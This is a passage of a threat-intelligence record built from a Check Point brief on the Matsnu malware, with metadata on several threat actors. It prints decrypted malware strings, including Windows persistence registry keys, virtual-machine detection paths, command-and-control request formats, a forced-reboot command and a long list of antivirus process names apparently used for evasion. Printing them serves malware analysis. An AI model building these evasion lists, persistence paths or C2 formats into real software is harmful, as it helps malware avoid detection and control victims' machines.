processes\n\n```\narp.exe\nat.exe\nattrib.exe\nbootcfg.exe\ncacls.exe\ncalc.exe\ncharmap.exe\nchkdsk.exe\nchkntfs.exe\ncipher.exe\ncleanmgr.exe\ncmdl32.exe\ncmmon32.exe\ncompact.exe\nconvert.exe\ndiskperf.exe\ndplaysvr.exe\ndpnsvr.exe\ndriverquery.exe\ndvdplay.exe\ndvdupgrd.exe\ndwwin.exe\ndxdiag.exe\neventcreate.exe\nexpand.exe\nextrac32.exe\nfind.exe\nfixmapi.exe\nfltmc.exe\nfontview.exe\nfsutil.exe\nftp.exe\ngpresult.exe\ngpupdate.exe\ngrpconv.exe\niexpress.exe\nipconfig.exe\nlabel.exe\nlodctr.exe\nlogagent.exe\nmobsync.exe\n\n```\n```\nnet1.exe\nnetstat.exe\nnotepad.exe\nopenfiles.exe\nping.exe\npowercfg.exe\npresentationhost.exe\nprint.exe\nproquota.exe\nrasautou.exe\nrasdial.exe\nrasphone.exe\nrecover.exe\nreg.exe\nregini.exe\nregsvr32.exe\nrelog.exe\nrunas.exe\nrundll32.exe\nrunonce.exe\nsc.exe\nsethc.exe\nsfc.exe\nshutdown.exe\nsort.exe\nsubst.exe\nsysteminfo.exe\ntaskkill.exe\ntasklist.exe\ntaskmgr.exe\ntcpsvcs.exe\ntracerpt.exe\ntypeperf.exe\nunlodctr.exe\nutilman.exe\nvssadmin.exe\nw32tm.exe\nwextract.exe\nwiaacmgr.exe\nwpdshextautoplay.exe\nwscript.exe\nxcopy.exe\n\n```\n\n-----\n\n# Appendix F –  Decrypted data chunk\n```\nSoftware\\Microsoft\\Windows\\CurrentVersion\\Run\nSoftware\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nSoftware\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\nRME83921\nEnumDisplayDevicesA\nHARDWARE\\ACPI\\DSDT\\PTLTD_\nVmWare\nHARDWARE\\ACPI\\DSDT\\VBOX__\nVirtualBox\nHARDWARE\\ACPI\\DSDT\\AMIBI\nVirtualPC\nDRIVE_NO_ROOT_DIR\nDRIVE_REMOVABLE\nDRIVE_FIXED\nDRIVE_REMOTE\nDRIVE_CDROM\nDRIVE_RAMDISK\nDRIVE_UNKNOWN\nHARDWARE\\DESCRIPTION\\System\\CentralProcessor\\%u\nProcessorNameString\nProcessorNameString\nID:\nComputer name:\nUser name:\nTarget process:\nWindows version:\nSystemLangID:\nUserLangID:\nCPU:\nGPU:\nVM:\nDrives:\nAV:\nsysinfo=\nget=sysinfo\nid=%s&mynum=%u&ver=%s&cvr=%u&threadid=%u&lang=0x%04X&os=%s&crcblw=%08x&%s\nGET=%s&AES=%s\nget=cmd\nidt=%u&code=%u\nget=raport\nget=config\nWAIT\nDLLLIST\nPROCLIST\nBLWORDS\n--- WAIT --dlllist=%s&proclist=%s\nIsWow64Process\nWow64EnableWow64FsRedirection\nshutdown.exe -r -f -t 0\nftp://\n\n```\n\n-----\n\n```\nhttp://\nhttps://\nMozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; .NET CLR 1.0.2914)\nContent-Type: application/x-www-form-urlencoded\navgcsrvx.exe,avgemcx.exe,avgidsagent.exe,avgnsx.exe,avgrsx.exe,avgtray.exe,avgwd\nsvc.exe,vprot.exe,toolbarupdater.exe,avgfws.exe,avastsvc.exe,avastui.exe,afwserv\n.exe,avguard.exe,avshadow.exe,avgnt.exe,sched.exe,avwebgrd.exe,avmailc.exe,avfws\nvc.exe,egui.exe,ekrn.exe,dwengine.exe,dwservice.exe,dwnetfilter.exe,frwl_svc.exe\n,frwl_notify.exe,spideragent.exe,avp.exe,op_mon.exe,acs.exe,ccsvchst.exe,elogsvc\n.exe,nhs.exe,nigsvc32.exe,niguser.exe,njeeves.exe,nnf.exe,npfsvc32.exe,npfuser.e\nxe,nprosec.exe,npsvc32.exe,nsesvc.exe,nvcoas.exe,nvoy.exe,zanda.exe,zlh.exe,popw\nndexe.exe,ravmond.exe,rsmgrsvc.exe,rstray.exe,cfp.exe,clps.exe,clpsls.exe,cmdage\nnt.exe,unsecapp.exe,avkproxy.exe,avkservice.exe,avktray.exe,avkwctl.exe,gdscan.e\nxe,gdfirewalltray.exe,gdfwsvc.exe,akvbackupservice.exe,tsnxgservice.exe,bdagent.\nexe,vsserv.exe,updatesrv.exe,uiwatchdog.exe,coreserviceshell.exe,coreframeworkho\nst.exe,uiseagnt.exe,pctssvc.exe,pctsauxs.exe,pctsgui.exe,fpavserver.exe,fprottra\ny.exe,agent.exe,iptray.exe,psimsvc.exe,pshost.exe,pavsrvx86.exe,psctrls.exe,pavj\nobs.exe,psksvc.exe,pavfnsvr.exe,tpsrv.exe,webproxy.exe,avengine.exe,pavprsrv.exe\n,srvload.exe,apvxdwin.exe,pavbckpt.exe,fsorsp.exe,fsgk32st.exe,fshoster32.exe,fs\ngk32.exe,fsma32.exe,fsdfwd.exe,fsm32.exe,msseces.exe,mcagent.exe,mcshield.exe,mc\nsvhost.exe,mfefire.exe,mfevtps.exe,mcpvtray.exe,bullguard.exe,bullguardbhvscanne\nr.exe,bullguardscanner.exe,bullguardupdate.exe,emlproxy.exe,onlinent.exe,opssvc.\nexe,quhlsvc.exe,sapissvc.exe,scanmsg.exe,scanwscs.exe,sbamsvc.exe,sbantray.exe,s\nbpimsvc.exe,vbcmserv.exe,vbsystry.exe,adaware.exe,adawarebp.exe,adawareservice.e\nxe,wajamupdater.exe,arcaconfsv.exe,arcamainsv.exe,arcaremotesvc.exe,arcataskserv\nice.exe,avmenu.exe,guardxkickoff.exe,guardxservicce.exe,confirm.dll,core.dll,fla\nsh.dll,imun.dll,imunsvc.exe,share.dll,panda_url_filtering.exe,psanhost.exe,psunm\nain.exe,solocfg.exe,solosent.exe,vba32ldr.exe,vbascheduler.exe\nENDDDDD\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://blog.checkpoint.com/wp-content/uploads/2015/07/matsnu-malwareid-technical-brief.pdf"
    ],
    "report_names": [
        "matsnu-malwareid-technical-brief.pdf"
    ],
    "threat_actors": [
        {
            "id": "bf6cb670-bb69-473f-a220-97ac713fd081",
            "created_at": "2022-10-25T16:07:23.395205Z",
            "updated_at": "2025-03-27T02:02:09.777308Z",
            "deleted_at": null,
            "main_name": "Bitter",
            "aliases": [
                "T-APT-17",
                "TA397"
            ],
            "source_name": "ETDA:Bitter",
            "tools": [
                "Artra Downloader",
                "ArtraDownloader",
                "Bitter RAT",
                "BitterRAT",
                "Dracarys"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "655f7d0b-7ea6-4950-b272-969ab7c27a4b",
            "created_at": "2022-10-27T08:27:13.133291Z",
            "updated_at": "2025-03-27T02:00:55.490812Z",
            "deleted_at": null,
            "main_name": "BITTER",
            "aliases": [
                "T-APT-17"
            ],
            "source_name": "MITRE:BITTER",
            "tools": [
                "ZxxZ"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "132e1e0f-8725-42cb-8c2d-d2f3ebb1f005",
            "created_at": "2023-12-08T02:00:05.758552Z",
            "updated_at": "2025-03-27T02:00:03.267631Z",
            "deleted_at": null,
            "main_name": "UAC-0118",
            "aliases": [
                "FRwL",
                "FromRussiaWithLove"
            ],
            "source_name": "MISPGALAXY:UAC-0118",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "578f8e62-2bb4-4ce4-a8b7-6c868fa29724",
            "created_at": "2022-10-25T16:07:24.344358Z",
            "updated_at": "2025-03-27T02:02:10.182282Z",
            "deleted_at": null,
            "main_name": "Tropic Trooper",
            "aliases": [
                "APT 23",
                "Bronze Hobart",
                "Earth Centaur",
                "KeyBoy",
                "Operation Tropic Trooper",
                "Pirate Panda",
                "Tropic Trooper"
            ],
            "source_name": "ETDA:Tropic Trooper",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "ByPassGodzilla",
                "CHINACHOPPER",
                "CREDRIVER",
                "China Chopper",
                "Chymine",
                "Darkmoon",
                "Gen:Trojan.Heur.PT",
                "KeyBoy",
                "Neo-reGeorg",
                "PCShare",
                "POISONPLUG.SHADOW",
                "Poison Ivy",
                "RoyalRoad",
                "SPIVY",
                "ShadowPad Winnti",
                "SinoChopper",
                "Swor",
                "TSSL",
                "USBferry",
                "W32/Seeav",
                "Winsloader",
                "XShellGhost",
                "Yahoyah",
                "fscan",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716501,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1436358912,
    "ts_modification_date": 1436358912,
    "files": {
        "pdf": "https://archive.orkl.eu/82f72b39fb12e02ddb2997f302c3898285da0022.pdf",
        "text": "https://archive.orkl.eu/82f72b39fb12e02ddb2997f302c3898285da0022.txt",
        "img": "https://archive.orkl.eu/82f72b39fb12e02ddb2997f302c3898285da0022.jpg"
    }
}